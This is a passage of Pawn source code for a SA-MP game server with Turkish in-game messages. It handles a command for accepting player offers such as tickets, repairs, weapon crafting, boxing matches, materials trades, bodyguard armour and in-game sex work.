                        if(GetPlayerCash(playerid) >= TicketMoney[playerid]) {
                            format(string, sizeof(string), "* $%d deðerinde cezayý %s kiþisine ödedin.", TicketMoney[playerid], GetPlayerNameEx(TicketOffer[playerid]));
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s adlý kiþi $%d deðerindeki cezayý ödedi.", GetPlayerNameEx(playerid), TicketMoney[playerid]);
                            SendClientMessage(TicketOffer[playerid], COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s adlý kiþi ona kesilen cezayý ödedi.", GetPlayerNameEx(playerid));
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                            GivePlayerCash(playerid, - TicketMoney[playerid]);
                            TicketOffer[playerid] = 999;
                            TicketMoney[playerid] = 0;
                            if(GetPlayerCash(playerid) < 1) GivePlayerCash(playerid, 0);
                            return 1;
                        }
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   Memur yanýnýzda deðil!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size bilet teklif etmedi!");
                return 1;
            }
        }
        else if(strcmp(params,"tamir",true) == 0) {
            if(RepairOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > RepairPrice[playerid]) {
                    if(IsPlayerInAnyVehicle(playerid)) {
                        if(IsPlayerConnected(RepairOffer[playerid])) {
                            GetPlayerName(RepairOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            RepairCar[playerid] = GetPlayerVehicleID(playerid);
                            RepairVehicle(RepairCar[playerid]);
                            PlayerInfo[RepairOffer[playerid]][pTire]--;

                            GivePlayerCash(RepairOffer[playerid], RepairPrice[playerid]);
                            GivePlayerCash(playerid, -RepairPrice[playerid]);
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(RepairOffer[playerid], ipex, sizeof(ipex));
                            format(string, sizeof(string), "* %s kiþisi %s kiþisinin aracýný tamir etti.", giveplayer, GetPlayerNameEx(playerid));
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                            format(string, sizeof(string), "*Aracýnýz %d TL karþýlýðýnda tamir edildi, Tamirci: %s.",RepairPrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

                            RepairWarn[playerid][RepairOffer[playerid]] += RepairPrice[playerid];
                            if(RepairWarn[playerid][RepairOffer[playerid]] >= 2500 && (PlayerInfo[RepairOffer[playerid]][pLevel] <= 3 || PlayerInfo[RepairOffer[playerid]][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) kiþisi, %s (IP:%s) kiþisinin aracýný %d TL fiyata tamir etti.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(RepairOffer[playerid]), ipex, RepairWarn[playerid][RepairOffer[playerid]]);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            format(string, sizeof(string), "* %s kiþisinin aracýný tamir ettiniz, %d TL hesabýnýza eklendi!",sendername,RepairPrice[playerid]);
                            SendClientMessage(RepairOffer[playerid], COLOR_LIGHTBLUE, string);

                            RepairOffer[playerid] = 999;
                            RepairPrice[playerid] = 0;
                            return 1;
                        }
                        return 1;
                    }
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_WHITE, "Tamiri ödeyecek paranýz yok!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_WHITE, "Kimse size arabanýzýn tamirini önermedi!");
                return 1;
            }
        }
        else if(strcmp(params,"zanaat",true) == 0) {
            if(CraftOffer[playerid] < 999) {
                if(IsPlayerConnected(CraftOffer[playerid])) {
                    if(ProxDetectorS(5.0, playerid, CraftOffer[playerid])) {
                        if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5) {
                            SendClientMessage(playerid, COLOR_GREY, "Hastanedeyken silah çýkaramazsýnýz.");
                            return 1;
                        }
                        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmadan önce araçtan ininiz.");
                        new weaponname[50];
                        format(weaponname, 50, "%s", CraftName[playerid]);
                        switch(CraftId[playerid]) {
                            case 1: {
                                PlayerInfo[playerid][pScrewdriver]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/silahsat");
                            }
                            case 3: {
                                PlayerInfo[playerid][pWristwatch]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/kolsaati");
                            }
                            case 5: {
                                PlayerInfo[playerid][pTire]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/tamtamir");
                            }
                            case 7: {
                                PlayerInfo[playerid][pFirstaid]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/ilkyardim");
                            }
                            case 8: {
                                GivePlayerValidWeapon(playerid, 43, 50);
                            }
                            case 9: {
                                PlayerInfo[playerid][pRccam]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/kamerayerlestir");
                            }
                            case 10: {
                                PlayerInfo[playerid][pReceiver]++;
                                SetPVarInt(playerid, "pReceiverMLeft", 40);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Sonraki dört departman radyo mesajýný alacaksýnýz.");
                            }
                            case 11: {
                                PlayerInfo[playerid][pGPS]++;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/gps");
                            }
                            case 12: {
                                PlayerInfo[playerid][pSweep]++;
                                PlayerInfo[playerid][pSweepLeft] = 3;
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "/bocektemizle");
                            }
                            case 13: {
                                GivePlayerValidWeapon(playerid, 46, 99999);
                            }
                        }
                        format(string, sizeof(string), "  %s kiþisine bir %s verdiniz.", GetPlayerNameEx(playerid),weaponname);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(CraftOffer[playerid], COLOR_GRAD1, string);
                        format(string, sizeof(string), "  %s silahýný %s kiþisinden aldýnýz.", weaponname, GetPlayerNameEx(CraftOffer[playerid]));
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        format(string, sizeof(string), "* %s kiþisi Materyallerden bir þey yapýp, %s kiþisine verdi.", GetPlayerNameEx(CraftOffer[playerid]), GetPlayerNameEx(playerid));
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        //new ip[32], ipex[32];
                        //GetPlayerIp(playerid, ip, sizeof(ip));
                        //GetPlayerIp(CraftOffer[playerid], ipex, sizeof(ipex));
                        //format(string, sizeof(string), "[CRAFTSMAN DEAL] %s (IP: %s) has bought a %s from %s (IP: %s)", GetPlayerNameEx(playerid), ip, weaponname, GetPlayerNameEx(CraftOffer[playerid]), ipex);
                        //Log("logs/pay.log", string);
                        PlayerInfo[CraftOffer[playerid]][pMats] -= CraftMats[playerid];
                        //PlayerInfo[CraftOffer[playerid]][pCraftSkill]++;
                        CraftOffer[playerid] = 999;
                        CraftId[playerid] = 0;
                        CraftMats[playerid] = 0;
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GRAD2, "Size silah satan kiþinin yanýnda olmalýsýnýz!");
                        return 1;
                    }
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size silah teklif etmedi!");
                return 1;
            }
        }
        else if(strcmp(params,"dovus",true) == 0) {
            if(BoxOffer[playerid] < 999) {
                if(IsPlayerConnected(BoxOffer[playerid])) {
                    new points;
                    new mypoints;
                    GetPlayerName(BoxOffer[playerid], giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    new level = PlayerInfo[BoxOffer[playerid]][pBoxSkill];
                    if(level >= 0 && level < 50) { points = 40; }
                    else if(level >= 50 && level < 100) { points = 50; }
                    else if(level >= 100 && level < 200) { points = 60; }
                    else if(level >= 200 && level < 400) { points = 70; }
                    else if(level >= 400) { points = 80; }
                    if(PlayerInfo[playerid][pJob] == 12 || PlayerInfo[playerid][pJob2] == 12) {
                        new clevel = PlayerInfo[playerid][pBoxSkill];
                        if(clevel >= 0 && clevel < 50) { mypoints = 40; }
                        else if(clevel >= 50 && clevel < 100) { mypoints = 50; }
                        else if(clevel >= 100 && clevel < 200) { mypoints = 60; }
                        else if(clevel >= 200 && clevel < 400) { mypoints = 70; }
                        else if(clevel >= 400) { mypoints = 80; }
                    }
                    else {
                        mypoints = 30;
                    }
                   	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Bunu þu anda yapamazsýnýz.");
						return 1;
					}
					else if(GetPVarInt(BoxOffer[playerid], "Injured") != 0||PlayerCuffed[BoxOffer[playerid]]!=0||GetPVarInt(BoxOffer[playerid], "Hospital")!=0)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "Bunu þu anda yapamazsýnýz.");
						return 1;
					}
					if(PlayerInfo[playerid][pJob] != 12 && PlayerInfo[playerid][pJob2] != 12)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "Boksör deðilsiniz!");
					    return 1;
					}
                    if(IsPlayerInRangeOfPoint(playerid,25.0, 765.952270, 4.167977, 1000.719238) && IsPlayerInRangeOfPoint(BoxOffer[playerid],25.0, 765.952270, 4.167977, 1000.719238))
					{
     					format(string, sizeof(string), "*  %s kiþisinden gelen boks müsabakasýný kabul ettiniz, %d canla dövüþeceksiniz.",giveplayer,mypoints);
                    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    	format(string, sizeof(string), "* %s kiþisi boks müsabakasý isteðinizi kabul etti, %d canla dövüþeceksiniz.",sendername,points);
                    	SendClientMessage(BoxOffer[playerid], COLOR_LIGHTBLUE, string);
                        ResetPlayerWeapons(playerid);
                        ResetPlayerWeapons(BoxOffer[playerid]);
                        SetPlayerHealth(playerid, mypoints);
                        SetPlayerHealth(BoxOffer[playerid], points);

                        SetPlayerArmourEx(playerid, 0);
                        SetPlayerArmourEx(BoxOffer[playerid],0);

                        SetPlayerInterior(playerid, 5); SetPlayerInterior(BoxOffer[playerid], 5);
                        SetPlayerPos(playerid, 758.498596, -1.915163, 1001.594238); SetPlayerFacingAngle(playerid, 309.27);
                        SetPlayerPos(BoxOffer[playerid], 763.229248, 2.429135, 1001.594238); SetPlayerFacingAngle(BoxOffer[playerid], 133.83);
                        TogglePlayerControllable(playerid, 0); TogglePlayerControllable(BoxOffer[playerid], 0);
                        GameTextForPlayer(playerid, "~r~Waiting", 3000, 1); GameTextForPlayer(BoxOffer[playerid], "~r~Waiting", 3000, 1);
                        BoxWaitTime[playerid] = 1; BoxWaitTime[BoxOffer[playerid]] = 1;
                        if(BoxDelay < 1) { BoxDelay = 10; }
                        InRing = 1;
                        Boxer1 = BoxOffer[playerid];
                        Boxer2 = playerid;
                        PlayerBoxing[playerid] = 1;
                        PlayerBoxing[BoxOffer[playerid]] = 1;
                        BoxOffer[playerid] = 999;
                        return 1;
                    }
				 	else
				 	{
  						SendClientMessage(playerid, COLOR_WHITE, "Boksörlerden birisi Ganton Gym içinde deðil!");
						return 1;
				 	}
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size boks müsabakasý önermedi!");
                return 1;
            }
        }
        else if(strcmp(params,"materyal",true) == 0)
		{
            if(MatsOffer[playerid] < 999)
			{
                if(GetPlayerCash(playerid) >= MatsPrice[playerid])
                {
                	if(IsPlayerConnected(MatsOffer[playerid]))
					{
    					if(GetPVarInt(playerid, "SellMatsTimer") > 0)
						{
							format(string, sizeof(string), "Materyali kabul etmeden önce %d saniye beklemelisiniz.", GetPVarInt(playerid, "SellMatsTimer"));
							SendClientMessage(playerid,COLOR_GREY,string);
							return 1;
						}
						if(PlayerInfo[MatsOffer[playerid]][pMats] < MatsAmount[playerid])
						{
						    SendClientMessage(playerid,COLOR_GREY, "Kiþi o kadar materyale sahip deðil!");
						    return 1;
						}
     					new ip[32], ipex[32];
          				GetPlayerIp(playerid, ip, sizeof(ip));
              			GetPlayerIp(MatsOffer[playerid], ipex, sizeof(ipex));
                 		format(string, sizeof(string), "[MATERIALS (%d)] %s (IP:%s) kiþisi $%d parayý %s (IP:%s) kiþisine ödedi", MatsAmount[playerid], GetPlayerNameEx(playerid), ip, MatsPrice[playerid], GetPlayerNameEx(MatsOffer[playerid]), ipex);
                   		Log("logs/pay.log", string);

						MatsWarn[playerid][MatsOffer[playerid]] += MatsPrice[playerid];
      					if(MatsWarn[playerid][MatsOffer[playerid]] >= 2500 && (PlayerInfo[MatsOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3))
				  		{
           					format(string, sizeof(string), "%s (IP:%s)kiþisi, %s (IP:%s) kiþisine $%d paraya materyali sattý.", GetPlayerNameEx(MatsOffer[playerid]), ipex, GetPlayerNameEx(playerid), ip, MatsWarn[playerid][MatsOffer[playerid]]);
                  			ABroadCast(COLOR_YELLOW, string, 1);
						}

         				format(string, sizeof(string), "* %d materyali $%d karþýlýðýnda %s kiþisinden aldýnýz.", MatsAmount[playerid], MatsPrice[playerid], GetPlayerNameEx(MatsOffer[playerid]));
            			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
              			format(string, sizeof(string), "* %s kiþisi %d materyalinizi aldý, $%d hesabýnýza eklendi.", GetPlayerNameEx(playerid), MatsAmount[playerid], MatsPrice[playerid]);
                		SendClientMessage(MatsOffer[playerid], COLOR_LIGHTBLUE, string);

                  		GivePlayerCash(MatsOffer[playerid], MatsPrice[playerid]);
						GivePlayerCash(playerid, -MatsPrice[playerid]);
                    	PlayerInfo[playerid][pMats] += MatsAmount[playerid];
                    	PlayerInfo[MatsOffer[playerid]][pMats] -= MatsAmount[playerid];

                    	MatsOffer[playerid] = 999;
                    	MatsPrice[playerid] = 0;
                    	MatsAmount[playerid] = 0;
					}
				}
                else
				{
                    SendClientMessage(playerid, COLOR_GREY, "Materyalleri alacak paranýz yok!");
                    return 1;
                }
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "Kimse size materyal teklif etmedi!");
                return 1;
            }
        }
        else if(strcmp(params,"silah",true) == 0) {
            if(GunOffer[playerid] < 999) {
                if(IsPlayerConnected(GunOffer[playerid])) {
                    if(ProxDetectorS(5.0, playerid, GunOffer[playerid])) {
                        if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5) {
                            SendClientMessage(playerid, COLOR_GREY, "Hastanedeyken silah çýkaramazsýnýz.");
                            return 1;
                        }
                        if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Þu an silah taþýmanýz kýsýtlandýðýndan bunu yapamazsýnýz!");
                        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmadan önce araçtan ininiz.");
                        new weaponname[32];
                        GetWeaponName(GunId[playerid], weaponname, sizeof(weaponname));
                        format(string, sizeof(string), "  %s kiþisine bir %s verdiniz.", GetPlayerNameEx(playerid),weaponname);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(GunOffer[playerid], COLOR_GRAD1, string);
                        format(string, sizeof(string), "  %s kiþisinden bir %s aldýnýz.", weaponname, GetPlayerNameEx(GunOffer[playerid]));
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        format(string, sizeof(string), "* %s kiþisi materyallerden bir silah yaptý, %s kiþisine verdi.", GetPlayerNameEx(GunOffer[playerid]), GetPlayerNameEx(playerid));
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        GivePlayerValidWeapon(playerid,GunId[playerid],50000);
                        //new ip[32], ipex[32];
                        //GetPlayerIp(playerid, ip, sizeof(ip));
                        //GetPlayerIp(GunOffer[playerid], ipex, sizeof(ipex));
                        //format(string, sizeof(string), "[WEAPON DEAL] %s(IP:%s) has bought a %s from %s(IP:%s)", GetPlayerNameEx(playerid), ip, weaponname, GetPlayerNameEx(GunOffer[playerid]), ipex);
                        //Log("logs/pay.log", string);
                        PlayerInfo[GunOffer[playerid]][pMats] -= GunMats[playerid];

                        if(GunId[playerid] > 15) {
							#if defined DOUBLE_EXP_ENABLED
								new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour)) {
				    				PlayerInfo[GunOffer[playerid]][pArmsSkill] += 2;
				    				SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
								}
								else {
									SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
									PlayerInfo[GunOffer[playerid]][pArmsSkill]++;
								}
							#else
							    PlayerInfo[GunOffer[playerid]][pArmsSkill]++;
							#endif
                        }

                        if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 50)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 2 oldu, daha çok silah çeþidi artýk açýk."); }
                        else if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 100)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 3 oldu, daha çok silah çeþidi artýk açýk."); }
                        else if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 200)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 4 oldu, daha çok silah çeþidi artýk açýk."); }
                        else if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 400)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 5 oldu, daha çok silah çeþidi artýk açýk."); }
                        GunOffer[playerid] = 999;
                        GunId[playerid] = 0;
                        GunMats[playerid] = 0;
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GRAD2, "Size silah satan kiþinin yanýnda olmalýsýnýz!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size silah önermedi!");
                return 1;
            }
        }
        else if(strcmp(params,"zirh",true) == 0) {
            if(GuardOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) >= GuardPrice[playerid]) {
                    if(IsPlayerConnected(GuardOffer[playerid])) {
                        if(ProxDetectorS(6.0, playerid, GuardOffer[playerid])) {
							if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
								return SendClientMessage(playerid, COLOR_GRAD2, "Etkinlikteyken iyileþtiremezsin!");
                            new Float:armour;
                            GetPlayerArmour(playerid, armour);
                            if(armour >= 50) {
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Zaten zýrhýnýz var!");
                                return 1;
                            }
                            if(PlayerBoxing[playerid] == 1)
                            {
                                SendClientMessage(playerid, COLOR_GREY, "Boks yaparken bodyguard kabul edemezsiniz.");
                                return 1;
                            }
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(GuardOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[BODYGUARD] %s (IP:%s) has paid $%d to %s (IP:%s)", GetPlayerNameEx(playerid), ip, GuardPrice[playerid], GetPlayerNameEx(GuardOffer[playerid]), ipex);
                            // Log("logs/pay.log", string);

                            GuardWarn[playerid][GuardOffer[playerid]] += GuardPrice[playerid];
                            if(GuardWarn[playerid][GuardOffer[playerid]] >= 2500 && (PlayerInfo[GuardOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) kiþisi %s (IP:%s) kiþisini $%d fiyata korudu.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(GuardOffer[playerid]), ipex, GuardWarn[playerid][GuardOffer[playerid]]);
                                // Log("logs/pay.log", string);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            SetPlayerArmourEx(playerid, 50);
                            GetPlayerName(GuardOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* $%d karþýlýðýnda %s kiþisinden koruma kabul ettiniz.",GuardPrice[playerid],GetPlayerNameEx(GuardOffer[playerid]));
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s korumanýzý kabul etti, $%d hesabýnýza eklendi.",GetPlayerNameEx(playerid),GuardPrice[playerid]);
                            SendClientMessage(GuardOffer[playerid], COLOR_LIGHTBLUE, string);
                            GivePlayerCash(GuardOffer[playerid], GuardPrice[playerid]);
                            GivePlayerCash(playerid, -GuardPrice[playerid]);
                            GuardOffer[playerid] = 999;
                            GuardPrice[playerid] = 0;
                            return 1;
                        }
                        else {
                            SendClientMessage(playerid, COLOR_GRAD2, "Size koruma öneren kiþinin yanýnda deðiþsiniz!");
                            return 1;
                        }
                    }
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   Korumaya yeterli paranýz yok!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size koruma önermedi!");
                return 1;
            }
        }
     	else if(strcmp(params,"sex",true) == 0) {
            if(SexOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > SexPrice[playerid]) {
                    if(IsPlayerConnected(SexOffer[playerid])) {
                        new Car = GetPlayerVehicleID(playerid);
                        if(IsPlayerInAnyVehicle(playerid) && IsPlayerInVehicle(SexOffer[playerid], Car)) {
                            GetPlayerName(SexOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* Hayat Kadýný %s ile seks yaptýnýz, ücret: $%d.", giveplayer, SexPrice[playerid]);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s kiþisi sizinle seks yaptý. $%d kazandýnýz.", sendername, SexPrice[playerid]);
                            SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, string);

                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(SexOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[SEX] %s (IP:%s) had sex with %s (IP:%s) for %d.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(SexOffer[playerid]), ipex, SexPrice[playerid]);
                            //Log("logs/pay.log", string);

                            SexWarn[playerid][SexOffer[playerid]] += SexPrice[playerid];
                            if(SexWarn[playerid][SexOffer[playerid]] >= 2500 && (PlayerInfo[SexOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) kiþisi %s (IP:%s) ile seks yaptý, ücret: $%d.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(SexOffer[playerid]), ipex, SexWarn[playerid][SexOffer[playerid]]);
                                //Log("logs/pay.log", string);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            GivePlayerCash(SexOffer[playerid], SexPrice[playerid]);
                            GivePlayerCash(playerid, -SexPrice[playerid]);

                            #if defined DOUBLE_EXP_ENABLED
								new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour))
								{
	 					 			PlayerInfo[SexOffer[playerid]][pSexSkill] += 2;
		   					 		SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
								}
								else
								{
									SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
									PlayerInfo[SexOffer[playerid]][pSexSkill]++;
								}
							#else
							    PlayerInfo[SexOffer[playerid]][pSexSkill]++;
							#endif

                            if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 50) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Seks Yeteneðiniz Level 2 oldu, daha iyi seks yapýp daha az hastalýk kapma riskiniz var.");
                            }
                            else if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 100) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Seks Yeteneðiniz Level 3 oldu, daha iyi seks yapýp daha az hastalýk kapma riskiniz var.");
                            }
                            else if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 200) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Seks Yeteneðiniz Level 4 oldu, daha iyi seks yapýp daha az hastalýk kapma riskiniz var.");
                            }
                            else if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 400) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Seks Yeteneðiniz Level 5 oldu, daha iyi seks yapýp daha az hastalýk kapma riskiniz var.");
                            }

                            if(!GetPVarType(playerid, "STD")) {
                                if(Condom[playerid] < 1) {
                                    new Float:health;
                                    new level = PlayerInfo[SexOffer[playerid]][pSexSkill];
                                    if(level >= 0 && level < 50) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 90) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 10.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD1));
                                        SetPVarInt(playerid, "STD", STD1[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD1[rand]);
                                        if(STD1[rand] == 0) {
                                            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seks yaparken 10 Can aldýnýz ve hiç cinsel hastalýk virüsü kapmadýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seks yaparken cinsel hastalýk kapmadýnýz.");
                                        }
                                        else if(STD1[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 10 Can + AIDS enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir AIDS kaptýnýz."); }
                                        else if(STD1[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 10 Can + Belsoðukluðu enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Belsoðukluðu kaptýnýz."); }
                                        else if(STD1[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 10 Can + Frengi enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Frengi kaptýnýz."); }
                                    }
                                    else if(level >= 50 && level < 100) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 80) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 20.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD2));
                                        SetPVarInt(playerid, "STD", STD2[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD2[rand]);
                                        if(STD2[rand] == 0) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seks yaparken 20 Can aldýnýz ve hiç cinsel hastalýk virüsü kapmadýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seks yaparken cinsel hastalýk kapmadýnýz."); }
                                        else if(STD2[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 20 Can + AIDS enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir AIDS kaptýnýz."); }
                                        else if(STD2[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 20 Can + Belsoðukluðu enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Belsoðukluðu kaptýnýz."); }
                                        else if(STD2[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 20 Can + Frengi enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Frengi kaptýnýz."); }
                                    }
                                    else if(level >= 100 && level < 200) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 70) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 30.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD3));
                                        SetPVarInt(playerid, "STD", STD3[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD3[rand]);
